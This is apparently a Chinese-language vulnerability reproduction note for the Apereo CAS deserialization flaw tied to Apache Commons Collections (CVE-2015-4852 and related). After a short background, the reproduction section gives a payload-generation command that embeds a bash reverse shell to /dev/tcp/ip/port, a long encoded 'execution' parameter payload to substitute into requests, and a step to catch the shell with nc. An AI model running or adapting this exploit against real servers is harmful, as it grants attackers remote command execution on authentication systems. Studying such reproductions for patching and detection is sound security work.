## Apereo CAS 反序列化验证  

### 框架介绍 

Central Authentication Service (CAS)，通常称为CAS。 CAS是一种针对Web的企业多语言单点登录解决方案，并尝试成为您的身份验证和授权需求的综合平台。Apereo CAS是一个开源框架，实现集中的登录授权服务。https://github.com/apereo/cas  


### 漏洞简介

相关的漏洞应该是CVE-2015-4852 CVE-2015-6420 CVE-2015-6934，Apache Commons Collections：通过InvokerTransformer执行代码。Apache Commons Collections被应用于很多java应用，transformer利用到了Java.lang.Runtime.exec（）执行字符串，当原始数据进行反序列化时，调用readObject（）方法构建对象，使用InvokerTransformer运行指定命令。  

该漏洞发现与15年，属于影响比较广泛的漏洞，通过readObject接口利用，涉及的类还有CloneTransformer，ForClosure，InstantiateFactory，InstantiateTransformer，PrototypeCloneFactory，PrototypeSerializationFactory，WhileClosure等。  

受影响产品可以参考：https://vigilance.fr/vulnerabilities/Apereo-CAS-Server-903000  

https://apereo.github.io/2016/04/08/commonsvulndisc/  

### 漏洞复现

CAS默认配置使用静态密钥来加密序列化的Java对象，exception参数中的后半部分的base64编码字符，就是加密了spring webflow execution.    

第一步：生成payload：  
	
	java -jar apereoCAS.jar Spring1linux "/bin/bash -i >& /dev/tcp/ip/port 0>&"  
	利用业界大牛的攻击jar包生成payload（工具非个人便不公开了）  
	
第二步：替换payload：  
	
execution=49cf56c5-da9d-41d9-95b4-934c741f7e3a_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  

exception是有uuid_base64编码组成  

第三步：通过nc监听端口，发送报文   

